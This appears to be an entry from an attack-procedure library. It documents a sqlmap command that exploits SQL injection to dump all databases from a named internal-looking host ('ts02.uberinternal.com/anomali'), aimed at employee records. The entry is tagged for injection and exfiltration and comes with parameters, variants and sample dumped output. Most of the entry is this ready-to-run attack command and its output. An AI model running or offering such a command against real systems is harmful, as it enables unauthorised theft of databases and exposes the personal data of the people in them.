---
id: cmd-sqlmap-dump
data: >-
  sqlmap -u "http://ts02.uberinternal.com/anomali/search?q=1" --dbms=mysql
  --dump-all --batch --threads=5
tags:
  - sqli
  - exfiltration
type: command
output: >-
  Database: anomali_db\nTable: employees\n[5
  entries]\n+----+----------+-----+\n| id | name     | role|
  \n+----+----------+-----+\n| 1  | John Doe | Eng |\n...
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.414Z'
verified: false
validated: true
submitted: true
---
# sqlmap-dump-data

## Command

```bash
sqlmap -u "http://ts02.uberinternal.com/anomali/search?q=1" --dbms=mysql --dump-all --batch --threads=5
```

## Description

This command leverages sqlmap to enumerate and extract all data from the backend database of a vulnerable web application, such as Anomali, after confirming SQL injection. It dumps tables into files for offline analysis, focusing on sensitive data like employee records.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL | Yes |
| `--dbms` | Specify database type (e.g., mysql) | No |
| `--dump-all` | Dump entire database | Yes |
| `--batch` | Non-interactive | No |
| `--threads` | Number of concurrent threads | No |

## Examples

### Basic Usage

```bash
sqlmap -u "http://example.com/search?q=1" --dump
```

### Advanced Usage

```bash
sqlmap -u "http://example.com/search?q=1" --dump -T employees --columns
```

## Expected Output

A series of CSV or SQLite files in the output directory, containing dumped tables with data like employee names, IDs, and roles.

## Related

- [[Related Procedure: Exploit-SQL-Injection-in-Anomali-Software]]
